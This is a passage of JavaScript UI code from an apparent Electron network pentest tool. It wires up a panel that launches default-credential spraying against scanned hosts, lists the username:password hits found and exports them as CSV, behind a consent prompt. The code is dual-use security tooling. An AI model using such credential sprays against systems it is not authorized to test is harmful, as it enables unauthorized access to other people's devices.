      ui.currentTargetDisplay.textContent = `[${currentProtocol.toUpperCase()}] ${currentIp}:${currentPort}`;
      ui.currentTargetDisplay.style.display = 'block';
    }
  },

  showError(msg) {
    if (!ui.errorBanner) return;
    ui.errorBanner.textContent = msg;
    ui.errorBanner.style.display = msg ? 'block' : 'none';
  },

  clearResults() {
    state.credSprayHits = [];
    if (ui.resultsTbody) {
      ui.resultsTbody.innerHTML = '';
      const empty = document.createElement('tr');
      empty.id = 'credspray-empty-row';
      empty.innerHTML = '<td colspan="4" style="text-align:center;color:var(--text-muted);padding:32px;">No findings recorded.</td>';
      ui.resultsTbody.appendChild(empty);
    }
    this.updateStats();
    if (ui.btnExport) ui.btnExport.disabled = true;
  },

  updateStats() {
    const hitsCount = state.credSprayHits.length;
    if (ui.statsText) ui.statsText.textContent = `${hitsCount} hit${hitsCount !== 1 ? 's' : ''}`;
    if (ui.footerHits) ui.footerHits.textContent = `${hitsCount} hits`;
  },

  appendHit(hit) {
    const emptyRow = document.getElementById('credspray-empty-row');
    if (emptyRow) emptyRow.remove();

    state.credSprayHits.push(hit);
    this.updateStats();

    const row = document.createElement('tr');
    row.className = 'hit-row animate-in';

    // XSS-Safe DOM Manipulation
    const tdTarget = document.createElement('td');
    tdTarget.style.cssText = 'color:var(--accent-primary);font-weight:600;';
    tdTarget.textContent = hit.target;

    const tdProto = document.createElement('td');
    const protoSpan = document.createElement('span');
    protoSpan.className = 'tag-protocol';
    protoSpan.textContent = hit.protocol.toUpperCase();
    tdProto.appendChild(protoSpan);

    const tdCreds = document.createElement('td');
    const credsCode = document.createElement('code');
    credsCode.style.color = 'var(--success)';
    credsCode.textContent = `${hit.user}:${hit.pass}`;
    tdCreds.appendChild(credsCode);

    const tdTime = document.createElement('td');
    tdTime.style.cssText = 'font-size:11px;color:var(--text-muted);';
    tdTime.textContent = fmtTime(hit.time);

    row.append(tdTarget, tdProto, tdCreds, tdTime);
    ui.resultsTbody?.prepend(row);

    if (ui.btnExport) ui.btnExport.disabled = false;
  }
};

/**
 * Creates a quick-action block for host cards.
 */
function createCredSprayQuickAction(ip) {
  const container = document.createElement('div');
  container.style.cssText = 'margin-top: 10px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;';
  
  const label = document.createElement('span');
  label.style.cssText = 'font-size: 11px; color: var(--text-muted);';
  label.textContent = '🔑 Default Creds:';
  
  const btn = document.createElement('button');
  btn.className = 'btn-action pentest-action';
  btn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
  btn.textContent = 'Spray Known Defaults';
  btn.title = `Launch credential spray against ${ip}`;
  btn.addEventListener('click', () => {
    openCredSprayPanel(ip);
  });

  container.append(label, btn);
  return container;
}

function openCredSprayPanel(prefilledIp) {
  if (prefilledIp && ui.targetIp) {
    ui.targetIp.value = prefilledIp;
    if (ui.targetMode) ui.targetMode.value = 'single';
    if (ui.targetIpGroup) ui.targetIpGroup.style.display = 'block';
  }
  if (ui.panel && typeof openPanel !== 'undefined') openPanel(ui.panel, ui.resizer);
}

function closeCredSprayPanel() {
  if (ui.panel && typeof closePanel !== 'undefined') closePanel(ui.panel, ui.resizer);
}

// --- Wire up Controls ---

if (ui.resizer && ui.panel) {
  initResizer(ui.resizer, ui.panel);
}

ui.btnOpen?.addEventListener('click', () => {
  if (ui.panel?.classList.contains('open')) closeCredSprayPanel();
  else openCredSprayPanel('');
});

ui.btnClose?.addEventListener('click', closeCredSprayPanel);

ui.targetMode?.addEventListener('change', () => {
  if (ui.targetIpGroup) {
    ui.targetIpGroup.style.display = ui.targetMode.value === 'single' ? 'block' : 'none';
  }
});

ui.btnStart?.addEventListener('click', async () => {
  if (state.isCredSprayRunning) return;

  const mode = ui.targetMode?.value || 'all';
  const targetIp = mode === 'single' ? ui.targetIp?.value?.trim() : null;
  
  if (mode === 'single' && !targetIp) {
    credSprayView.showError('Target IP is required for single mode.');
    return;
  }

  const selectedProtos = [];
  ui.protoCbs.forEach(cb => { if (cb.checked) selectedProtos.push(cb.value); });

  if (selectedProtos.length === 0) {
    credSprayView.showError('Select at least one protocol.');
    return;
  }

  // Pentest Consent Check
  if (!pentestConsentAccepted) {
    pendingBfConfig = { 
      _type: 'credspray', 
      mode, 
      targetIp, 
      protocols: selectedProtos,
      stopOnHit: !!ui.stopOnHitCb?.checked
    };
    pentestConsentOverlay?.classList.remove('hidden');
    return;
  }

  credSprayView.showError(null);
  credSprayView.setRunning(true);
  
  if (ui.progressText) ui.progressText.textContent = 'Starting...';

  const opts = {
    targets: mode === 'single' ? [targetIp] : state.hosts.map(h => h.ip),
    protocols: selectedProtos,
    stopOnFirstHit: !!ui.stopOnHitCb?.checked,
    delayMs: 200
  };

  try {
    await api.startCredSpray(opts);
  } catch (err) {
    credSprayView.showError(`Failed to start: ${err.message}`);
    credSprayView.setRunning(false);
  }
});

ui.btnStop?.addEventListener('click', async () => {
  try {
    await api.stopCredSpray();
  } catch { /* ignore */ }
  credSprayView.setRunning(false);
  if (ui.progressText) ui.progressText.textContent = 'Stopped';
});

ui.btnClear?.addEventListener('click', () => {
  if (state.isCredSprayRunning) return;
  credSprayView.clearResults();
});

ui.btnExport?.addEventListener('click', () => {
  if (state.credSprayHits.length === 0) return;
  const header = 'Target,Protocol,User,Password,Time\n';
  const csvRows = state.credSprayHits.map(h => 
    `"${h.target}","${h.protocol}","${h.user}","${h.pass}","${fmtTime(h.time)}"`
  ).join('\n');
  
  const blob = new Blob([header + csvRows], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `credspray_hits_${new Date().toISOString().split('T')[0]}.csv`;
  a.click();
  URL.revokeObjectURL(url);
});

// --- IPC Listeners ---

window.electronAPI.onCredSprayHit?.((hit) => {
  credSprayView.appendHit(hit);
});

window.electronAPI.onCredSprayProgress?.((data) => {
  credSprayView.updateProgress(data);
});

window.electronAPI.onCredSprayComplete?.((data) => {
  credSprayView.setRunning(false);
  if (ui.progressBar) ui.progressBar.style.width = '100%';
  if (ui.progressPct) ui.progressPct.textContent = '100%';
  const secs = (data.elapsed / 1000).toFixed(1);
  if (ui.progressText) ui.progressText.textContent = `Finished in ${secs}s (${data.hits} hits)`;
});

window.electronAPI.onCredSprayError?.((data) => {
  credSprayView.setRunning(false);
  credSprayView.showError(data.message || 'Spray error occurred');
});

// Expose internal helpers
window.__openCredSprayPanel = openCredSprayPanel;
